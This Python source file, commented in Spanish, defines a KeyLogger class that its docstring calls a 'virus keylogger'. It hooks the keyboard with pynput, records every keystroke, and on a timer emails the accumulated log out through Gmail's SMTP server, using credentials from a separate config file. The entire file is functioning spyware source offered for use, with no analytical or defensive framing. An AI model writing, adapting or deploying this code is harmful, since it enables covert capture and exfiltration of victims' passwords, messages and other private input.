"""Provee la clase KeyLogger con la cual podemos iniciar el virus keylogger
"""

import smtplib

import threading

from pynput import keyboard 

import credentials as C # accede al archivo de configuración con las credenciales.

# Create Keylogger Class

class KeyLogger:

    # se definen las variables iniciales del objeto

    def __init__(self):
        self.interval = C.TIME_INTERVAL
        self.log = "KeyLogger has started..."
        self.email = C.FROM
        self.password = C.PASSWORD

    # Crea el log donde se guardan las teclas que se han presionado

    def append_to_log(self, string):
        self.log = self.log + string

    # Crea el Keylogger

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)


    # Crea la estructura para el envio de los correos electrónicos

    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    # Envia el correo 

    def report_n_send(self):
        send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()

    # Inicializa el keylogger y el envio de correos

    def start(self):
        keyboard_listener = keyboard.Listener(on_press = self.on_press)
        with keyboard_listener:
            self.report_n_send()
            keyboard_listener.join()
